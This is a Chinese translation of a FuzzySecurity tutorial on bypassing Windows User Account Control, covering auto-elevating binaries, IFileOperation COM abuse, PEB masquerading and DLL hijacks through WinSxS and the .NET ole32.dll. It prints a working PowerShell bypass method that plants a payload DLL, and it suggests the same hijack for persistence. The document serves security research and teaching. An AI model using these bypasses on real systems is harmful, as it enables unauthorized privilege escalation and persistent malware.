# UAC攻击剖析

原文：[fuzzysecurity](http://www.fuzzysecurity.com/tutorials/27.html)

译者：[MottoIn](http://www.mottoin.com)

来源：[http://www.mottoin.com/90755.html](http://www.mottoin.com/90755.html)

## 0x00 前言 ##

![](http://img.mottoin.com/wp-content/uploads/2016/10/14461067301656.png)

在这篇文章中，我们将讨论**UAC（用户帐户控制）**绕过攻击中涉及到的基本原则。**UAC(User Account Control，用户帐户控制)**是微软为提高系统安全而在Windows Vista中引入的新技术，它要求用户在执行可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。

**UAC**在Windows Vista中被引入，使管理员用户能够使用标准用户权限而不是管理权限来对计算机进行操作。默认情况下，Windows上的初始用户帐户是管理员组的一部分，这只是一个简单的要求。正是因为这样，回到之前(Vista时代之前)，开发人员倾向于用户具有本地管理员权限，在开发他们的应用程序时需要提升权限。对此，官方的说法是**UAC**的引入是作为遏制这种行为并提供向后兼容性的方法。

尽管如此，**UAC**的直接好处是保护或提醒管理员用户免受软件组件执行的恶意提权行为。我认为UAC实际上是一个非常熟练的安全机制(如果我们忘记普遍存在的dll侧面加载问题)，任谁想争辩说，这只需要看看一些先进的恶意软件工具包或者如**Metasploit/Cobalt Strike**等开源框架，其中包括了绕过UAC的机制。此外，我们不要忘记微软已经修补了一大堆绕过漏洞，例如使用WUSA提取CAB文件到一个特定的路径。无法实现可信的侧面加载修复，如果实现了将会大大提高终端用户的安全。

无论如何，**UAC**总是引发激烈的辩论，所以我不会再谈论这个问题。让我们挖掘一下这个“兼容性”功能的漏洞

## 0x01 资源 ##

- [Bypass-UAC (@FuzzySec)](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)
- [UACME (@hFireF0X)](https://github.com/hfiref0x/UACME)
- [Bypassing Windows User Account Control (UAC) and ways of mitigation (@ParvezGHH)](https://www.greyhathacker.net/?p=796)
- [Fileless”UAC Bypass Using eventvwr.exe and Registry Hijacking (@enigma0x3)](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
- [Bypassing UAC on Windows 10 using Disk Cleanup (@enigma0x3)](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/)
- [Bypassing User Account Control (UAC) using TpmInit (@Cneelis)](http://uacmeltdown.blogspot.be/2016/08/bypassing-user-account-control-uac.html)
- [Inside Windows 7 User Account Control (Microsoft Technet)](https://technet.microsoft.com/en-us/magazine/2009.07.uac.aspx)
- [Inside Windows Vista User Account Control (Microsoft Technet)](https://technet.microsoft.com/en-us/magazine/2007.06.uac.aspx)
- [User Account Control (MSDN)](https://blogs.msdn.microsoft.com/e7/2008/10/08/user-account-control/)

## 0x02 自动提升 ##

这里要理解的主要事情是，当进程正常启动而不是提升特权时，管理用户创建的进程令牌被剥夺了某些特权（例如：作为管理员运行..）。我们可以通过使用**Get-TokenPrivs**或**Sysinternals**过程资源管理器转储令牌权限来轻松地验证这一点。下面的屏幕截图显示了“cmd.exe”的两个实例，一个正常启动，一个作为管理员启动。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_1.png)

从本质上说是属于管理员组的用户以与其他用户相同的权限管理其计算机。那么，高权限用户和低权限用户之间有什么区别？提权的操作仍然需要更改这个令牌，取决于**UAC**的设置，可以通知用户/要求密码。

但至关重要的是，在两个**UAC**设置之间，其中之一是默认值，如果用户属于管理员组，Windows程序将自动升级。这些二进制文件可以通过转储其清单来标识，如下所示。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_2.png)

找到这些二进制文件的一个简单方法是递归转储字符串并搜索“**autoElevate> true**”。这里的逻辑是这些二进制文件是由微软签署的，考虑到他们的出处，并且用户是管理员，没有必要提示这个行为（换句话说，它是一个可用性功能）。

这似乎是合理的，直到你打开[进程监视器](https://technet.microsoft.com/en-us/sysinternals/processmonitor.aspx)并找二进制文件成功地加载他们需要的资源（不仅是dll，还有注册表项）。不幸的是，这为恶意用户提供了充足的劫持机会。

下面的例子显示了一个众所周知的情况，其中**MMC**用于提升**RSOP**，**RSOP**反过来试图高完整性的加载“**wbemcomn.dll**”（ =同样的Administrator）。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_3.png)

可笑的是，看着过滤的输出，在这里至少有三个其他的UAC 0days（..sign）。如果有人想给[Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)提交pull，请自己敲出来！

## 0x03 提权文件操作 ##

你可能会想“这些dll都在一个安全的目录”！像我们上面讨论的二进制文件，也有自动提升COM对象。这些COM对象之一对我们特别有用，[IFileOperation](https://msdn.microsoft.com/en-us/library/windows/desktop/bb775771(v=vs.85).aspx)这个COM对象包含许多有用的方法，如文件系统对象（文件和文件夹）的复制/移动/重命名/删除。

传统上，攻击者编写的dll会实例化IFileOperation COM对象，并会执行将攻击者文件移动到受保护目录的方法（如上面例子的`C:\Windows\System32\wbem\wbemcomn.dll`）。获得COM对象自动将DLL注入到一个运行在一个可信目录的媒体完整性过程，通常是“explorer.exe”（ `-> fdwReason == DLL_PROCESS_ATTACH`）。示例dll源码

然而，事实证明有一种更灵活的方式来保持IFileOperation方法，将DLL注入到任何地方而不会触发警报。COM对象依赖进程状态API（[PSAPI](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684884(v=vs.85).aspx)）来标识它们正在运行的进程。有趣的是，PSAPI解析进程PEB以获取此信息，但攻击者可以获取其自己进程的句柄并覆盖PEB以唬弄PSAPI，作为结果任何一个COM对象都可从伪造的PID实例化。

我写了一个PowerShell POC（[Masquerade-PEB](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Masquerade-PEB.ps1)）来说明这一点。在下面的示例中，PowerShell被伪装为explorer，Sysinternals进程资源管理器显然也被欺骗了。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_4.png)

## 0x04 案例研究：winsxs，UAC 0day ##

在下面的案例研究中，我们将看看Windows（**WinSxS**）dll加载问题。WinSxS在Windows ME中引入作为所谓的“dll hell”问题的解决方案。基本上它类似于全局程序集缓存，当一个二进制需要访问一个特定的库，它可以参考它清单中的库的版本，操作系统将继续从WinSxS文件夹(`C:\Windows\WinSxS`)加载相关的DLL。

对于我们的案例研究，我们将看看自动升级的Microsoft远程协助二进制文件（`C：\Windows\ System32\msra.exe`）。下面我们可以看到二进制文件的内容。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_5.png)

注意依赖部分，**mrsa**需要一些 “`Microsoft.Windows.Common-Controls`” 版本的库。让我们看看执行**msra**时进程监视器中会发生什么。

![](http://www.fuzzysecurity.com/tutorials/images/UAC_6.png)

**msra**寻找一个名为“`msra.exe.Local`”的目录，当它找不到该文件夹时它会访问“`C：\Windows\WinSxS`”，并加载它清单中指定的库。开发人员进行调试时可以合法使用dotlocal文件夹。你可以猜测当我们创建以下目录结构时会发生什么。

    # We can do this using elevated IFileOperation COM object methods
    
    C:\Windows\System32\
      |__> msra.exe.Local
      |___> x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.10586.494_none_ea85e725b9ba5a4b

![](http://www.fuzzysecurity.com/tutorials/images/UAC_7.png)

如此多的* facepalm *，在这一点上我们需要做的是使用**IFileOperation COM**对象创建有payload DLL的文件夹并在命令行中执行MSRA，以此来绕过UAC。这有点过分简单，因为有效载荷dll可能会转发一些dll出口，但你得有想法。

选择**WinSxS**作为案例研究的原因是，当你开始看自动提升二进制文件时，你会逐字地看到这个问题。推荐阅读[KernelMode](http://www.kernelmode.info/forum/viewtopic.php?f=11&t=3643&start=110)线程。

## 0x05 案例研究：通过.NET劫持Ole32.dll=> Bypass-UAC ##

因为这种类型UAC绕过的有很多活动部件（使用提升的COM），我创建了一个PowerShell框架来处理所有的累活。[Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)有几个不同的组件：（1）Masquerade-PEB负责处理进程欺骗，(2) Invoke-IFileOperation暴露IFileOperation COM对象方法到PowerShell，（3）Emit-Yamabiko将payload dll存到磁盘。

在过去的案例研究，我找了一个相对简单的UAC  “0day”，我想找到一个不需要我更新Yamabiko的东西，这将工作在x32 / x64 Win7-Win10上。最后，我解决了.NET框架滥用负载的行为。有很多的方法来触发错误的加载行为，但是我们将使用MMC绕过UAC（* .msc）。

### Profiling MMC: ###

让我们看看在启动“mmc gpedit.msc”时过程监视器中发生了什么（过滤：命令行有“mmc”，名称未找到，路径有“dll”）。下面的截图分别显示了Win 7和Win 10的结果。

#### Win7 ####

![](http://www.fuzzysecurity.com/tutorials/images/UAC_8.png)

#### Win10 ####

![](http://www.fuzzysecurity.com/tutorials/images/UAC_9.png)

两个操作系统版本有一些可怕的条目！然而，忽略**oddballs**和那些不重叠的条目，我们留下“**MFC42LOC.DLL**”和“**ole32.dll**”。**MFC42LOC**需要一些进一步的研究，我已经看过它几次，但似乎没有发挥好。另一方面，**Ole32**被证明是一个合适的选择。

### Hijacking Ole32: ###

我们需要解决的一个问题是，DLL显然是从一个不同的目录加载，一个简短的调查显示它默认的.NET版本文件夹查找**ole32**。我们可以使用以下**PowerShell**命令获取该版本。

    # Win 7
    PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
    v2.0.50727
    
    # Win 10
    PS C:\> [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
    v4.0.30319

另一个不明显的问题是，在Bypass-UAC中的[Yamabiko代理dll](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Bypass-UAC/Yamabiko/Yamabiko/dllmain.c)打开PowerShell，PowerShell本身会引发这个错误加载bug从而导致无限shell弹出…，为了避免这种行为，我们必须检测我们的payload dll被加载并删除它，所以它只执行一次！

### Bypass-UAC实现： ###

添加方法绕过UAC是很容易的，如果你想了解更多，请查看在[GitHub](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)上的项目！为了让我们的bypass更加便利，我添加了以下方法，如果有任何问题，请随时留言！

    'UacMethodNetOle32'
    {
    # Hybrid MMC method: mmc some.msc -> Microsoft.NET\Framework[64]\..\ole32.dll
    # Works on x64/x32 Win7-Win10 (unpatched)
    if ($OSMajorMinor -lt 6.1) {
    echo "[!] Your OS does not support this method!`n"
    Return
    }
     
    # Impersonate explorer.exe
    echo "`n[!] Impersonating explorer.exe!"
    Masquerade-PEB -BinPath "C:\Windows\explorer.exe"
     
    if ($DllPath) {
    echo "[>] Using custom proxy dll.."
    echo "[+] Dll path: $DllPath"
    } else {
    # Write Yamabiko.dll to disk
    echo "[>] Dropping proxy dll.."
    Emit-Yamabiko
    }
     
    # Get default .NET version
    [String]$Net_Version = [System.Reflection.Assembly]::GetExecutingAssembly().ImageRuntimeVersion
     
    # Get count of PowerShell processes
    $PS_InitCount = @(Get-Process -Name powershell).Count
     
    # Expose IFileOperation COM object
    Invoke-IFileOperation
     
    # Exploit logic
    echo "[>] Performing elevated IFileOperation::MoveItem operation.."
    # x32/x64 .NET folder
    if ($x64) {
    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\'), "ole32.dll")
    } else {
    $IFileOperation.MoveItem($DllPath, $($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\'), "ole32.dll")
    }
    $IFileOperation.PerformOperations()
     
    echo "`n[?] Executing mmc.."
    IEX $($env:SystemRoot + '\System32\mmc.exe gpedit.msc')
     
    # Move Yamabiko back to %tmp% after it loads to avoid infinite shells!
    while ($true) {
    $PS_Count = @(Get-Process -Name powershell).Count
    if ($PS_Count -gt $PS_InitCount) {
    try {
    # x32/x64 .NET foler
    if ($x64) {
    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework64\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
    } else {
    $IFileOperation.MoveItem($($env:SystemRoot + '\Microsoft.NET\Framework\' + $Net_Version + '\ole32.dll'), $($env:Temp + '\'), 'ole32.dll')
    }
    $IFileOperation.PerformOperations()
    break
    } catch {
    # Sometimes IFileOperation throws an exception
    # when executed twice in a row, just rerun..
    }
    }
    }
     
    # Clean-up
    echo "[!] UAC artifact: $($env:Temp + '\ole32.dll')`n"
    }

案例结束，下面的屏幕截图演示了在Windows 8（x64）和Windows 10（x32）上的绕过。

### Win8 x64 ###

![](http://www.fuzzysecurity.com/tutorials/images/UAC_10.png)

### Win10 x32 ###

![](http://www.fuzzysecurity.com/tutorials/images/UAC_11.png)

从另一方面来说，这是一个相当不错的持久化机制。删除ole32在.NET框架文件夹中封装的DLL，计划使用.NET在启动/空闲时运行任何事情。

## 0x06 总结 ##

如果你做到这一步，我想你就能明白为什么微软不承认UAC绕过。老实说我认为，让UAC步入正轨的最好的方法是积极的补丁机制。